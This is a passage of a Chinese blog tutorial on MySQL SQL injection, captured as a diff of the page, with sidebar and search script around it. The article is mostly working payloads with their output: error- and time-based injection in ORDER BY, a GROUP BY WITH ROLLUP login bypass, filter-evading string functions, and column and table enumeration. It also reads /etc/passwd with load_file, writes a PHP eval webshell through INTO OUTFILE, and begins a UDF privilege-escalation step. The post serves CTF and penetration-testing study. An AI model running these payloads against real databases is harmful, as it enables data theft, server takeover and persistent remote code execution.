class="line"></span><br><span class="line">mysql&gt; select Db,User from db order by extractvalue(rand(),if(1=2,1,user()));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhost&apos;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>基于时间的注入</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Db,User from db order by if(1=0,1,sleep(2));	//延迟两秒执行</span><br><span class="line">mysql&gt; select Db,User from db order by if(1=1,1,sleep(2));	//立即执行</span><br></pre></td></tr></table></figure>
+<p>​    <strong>group by</strong></p>
+<p>mysql for mac利用group by时会报错，因为默认开启了only_full_group_by SQL模式:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@session.sql_mode;</span><br><span class="line">+-------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| @@session.sql_mode                                                                                                                        |</span><br><span class="line">+-------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |</span><br><span class="line">+-------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>利用如下语句就可更改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global sql_mode=&apos;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set session sql_mode=&apos;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>验证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test group by pwd with rollup;</span><br><span class="line">+----+--------+-----------+---------------+</span><br><span class="line">| id | user   | pwd       | mail          |</span><br><span class="line">+----+--------+-----------+---------------+</span><br><span class="line">| 1  | admin  | admin123  | admin@qq.com  |</span><br><span class="line">| 2  | guest  | guest123  | guest@qq.com  |</span><br><span class="line">| 3  | hacker | hacker123 | hacker@qq.com |</span><br><span class="line">| 3  | hacker | NULL      | hacker@qq.com |</span><br><span class="line">+----+--------+-----------+---------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>上面的验证例子可以看到，利用group by with rollup统计方法进入查询时会产生一个null的行，在利用的时候可以用limit或offset将null取出来然后传入空的查询字段，查询语句变成null=null，绕过验证</p>
+<h4 id="不常用函数绕过过滤"><a href="#不常用函数绕过过滤" class="headerlink" title="不常用函数绕过过滤"></a>不常用函数绕过过滤</h4><p>一般CTF或者实战中会过滤一些常用SQL查询函数，所以我们可以用一些不常用的函数来绕过过滤</p>
+<p>lpad(data,1,space(1))         //rpad()同理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lpad(user(),15,space(1));</span><br><span class="line">+--------------------------+</span><br><span class="line">| lpad(user(),15,space(1)) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|  root@localhost          |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>left(data,1) </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select left(user(),15);</span><br><span class="line">+-----------------+</span><br><span class="line">| left(user(),15) |</span><br><span class="line">+-----------------+</span><br><span class="line">| root@localhost  |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>reverse(right(reverse(data),1)) </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select reverse(right(reverse(user()),15));</span><br><span class="line">+------------------------------------+</span><br><span class="line">| reverse(right(reverse(user()),15)) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| root@localhost                     |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>insert(insert(data,0,0,space(0)),0,0,0)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select insert(insert(user(),0,0,space(0)),0,0,0);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| insert(insert(user(),0,0,space(0)),0,0,0) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| root@localhost                            |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>length(trim(leading ‘a’ from data))</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(trim(leading &apos;a&apos; from user()));</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| length(trim(leading &apos;a&apos; from user())) |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                    14 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>length(replace(data,’a’,’’))        </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(replace(user(),&apos;a&apos;,&apos;&apos;));</span><br><span class="line">+--------------------------------+</span><br><span class="line">| length(replace(user(),&apos;a&apos;,&apos;&apos;)) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                             13 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(replace(user(),&apos;o&apos;,&apos;&apos;));</span><br><span class="line">+--------------------------------+</span><br><span class="line">| length(replace(user(),&apos;o&apos;,&apos;&apos;)) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                             10 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>locate(‘a’,data)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select locate(&apos;r&apos;,user());</span><br><span class="line">+--------------------+</span><br><span class="line">| locate(&apos;r&apos;,user()) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&apos;o&apos;,user());</span><br><span class="line">+--------------------+</span><br><span class="line">| locate(&apos;o&apos;,user()) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  2 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select locate(&apos;host&apos;,user());</span><br><span class="line">+-----------------------+</span><br><span class="line">| locate(&apos;host&apos;,user()) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                    11 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>instr(data,’a’)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select instr(user(),&apos;o&apos;);</span><br><span class="line">+-------------------+</span><br><span class="line">| instr(user(),&apos;o&apos;) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 2 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>position(‘a’ in data);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select position(&apos;o&apos; in user());</span><br><span class="line">+-------------------------+</span><br><span class="line">| position(&apos;o&apos; in user()) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       2 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>不用关键字进行查询来绕过过滤：</strong></p>
+<ul>
+<li>爆字段：</li>
+</ul>
+<p>在不知道字段的时候可以参考如下方法进行注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from test)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;</span><br><span class="line">+---------------+-------+----------+--------------+</span><br><span class="line">| id            | user  | pwd      | mail         |</span><br><span class="line">+---------------+-------+----------+--------------+</span><br><span class="line">| 1             | admin | admin123 | admin@qq.com |</span><br><span class="line">| hacker@qq.com | 1     | 1        | 1            |</span><br><span class="line">+---------------+-------+----------+--------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+<p>当union被过滤时，可以用如下方法爆第一个字段名(原理是在使用别名的时候不能出现相同的字段名，利用join把表扩充，查询到重复字段成功通过报错信息爆出第一个字段名)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 from test where id=1 and (select * from(select * from test as a join test as b) as c);                                                     </span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;id&apos;</span><br></pre></td></tr></table></figure>
+<p>利用using关键字爆第二个字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 from test where id=1 and (select * from(select * from test as a join test as b using(id))as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;user&apos;</span><br></pre></td></tr></table></figure>
+<p>同理爆第三个字段的方法为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 from test where id=1 and (select * from(select * from test as a join test as b using(id,user))as c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &apos;pwd&apos;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>爆表</li>
+</ul>
+<p>爆表利用的是polygon函数，polygon函数传入的参数如果不是存在的字段名的话就会报错，但如果传入的是一个存在的字段名就会报出已知库表列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where id=1 and polygon(1);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;1&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from test where id=1 and polygon(id);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`mysql`.`test`.`id`&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>爆库</p>
+<p>当限制了payload长度时，可以利用如下方法进行爆库名(原理是如果使用的自定义函数不存在，就会爆出这个库和表不存在此函数)</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where id=1 and polygon(id);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &apos;`mysql`.`test`.`id`&apos; value found during parsing</span><br></pre></td></tr></table></figure>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h4><p>mysql中的<code>secure_file_priv</code>全局系统变量用于限制数据的导入导出操作，当这个变量值为空时就能使用函数，5.5.53版本后的值默认为null就不能使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@version;</span><br><span class="line">+-----------+</span><br><span class="line">| @@version |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.21    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><strong>读文件：</strong>load_file()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/etc/passwd&apos;);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>load_file的默认目录为@@datadir</li>
+<li>读文件有最大限制@@max_allowed_packet可以查看文件读取最大值，这个值依版本不同而不同</li>
+</ul>
+<p><strong>写文件：</strong>into outfile()/dumpfile()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_post[&apos;c&apos;]);?&gt;&apos; into outfile &apos;www/muma.php&apos;;</span><br></pre></td></tr></table></figure>
+<p>虽然两个函数都可用于写入文件，但是区别很大：</p>
+<ul>
+<li>into outfile写文件时会在每行结束时自动加上换行符</li>
+<li>into dumpfile写文件时会保持文件得到原始内容，对写入二进制文件时效果最好，例如在使用udf提权时上传二进制文件就只能用into dumpfile </li>
+<li>但是当我们要导出数据库时，却不能用into dumpfile，因为dumpfile只能导出一行数据</li>
+<li>into outfile不会覆盖文件</li>
+<li>into outfile必须是查询语句的最后一句</li>
+<li>路径名不能编码，且必须使用单引号</li>
+</ul>
+<p>顺便复习一下udf.dll提权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;%plugin%&apos;;</span><br><span class="line">+-------------------------------+-------------------------------------------------------+</span><br><span class="line">| Variable_name                 | Value                                                 |</span><br><span class="line">+-------------------------------+-------------------------------------------------------+</span><br><span class="line">| default_authentication_plugin | mysql_native_password                                 |</span><br><span class="line">| plugin_dir                    | /usr/local/mysql-5.7.21-macos10.13-x86_64/lib/plugin/ |</span><br><span class="line">+-------------------------------+-------------------------------------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from func;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(&apos;udf.dll hex code&apos;) into dumpfile &apos;/usr/local/mysql-5.7.21-macos10.13-x86_64/lib/plugin/test.dll&apos;;</span><br><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement		//因为新版本的mysql默认关闭了读写权限，先去打开</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Owasp-top-10/" rel="tag"><i class="fa fa-tag"></i> Owasp top 10</a>
+          
+            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/12/基于false的SQL注入/" rel="next" title="基于false的SQL注入">
+                <i class="fa fa-chevron-left"></i> 基于false的SQL注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/26/PostgreSQL从入门到放弃/" rel="prev" title="PostgreSQL从入门到放弃">
+                PostgreSQL从入门到放弃 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用注入关键字"><span class="nav-number">1.</span> <span class="nav-text">常用注入关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用绕过字符过滤"><span class="nav-number">2.</span> <span class="nav-text">常用绕过字符过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入技巧"><span class="nav-number">3.</span> <span class="nav-text">注入技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#limit注入"><span class="nav-number">3.1.</span> <span class="nav-text">limit注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by注入"><span class="nav-number">3.2.</span> <span class="nav-text">order by注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不常用函数绕过过滤"><span class="nav-number">3.3.</span> <span class="nav-text">不常用函数绕过过滤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件操作"><span class="nav-number">4.</span> <span class="nav-text">文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件操作权限"><span class="nav-number">4.1.</span> <span class="nav-text">文件操作权限</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
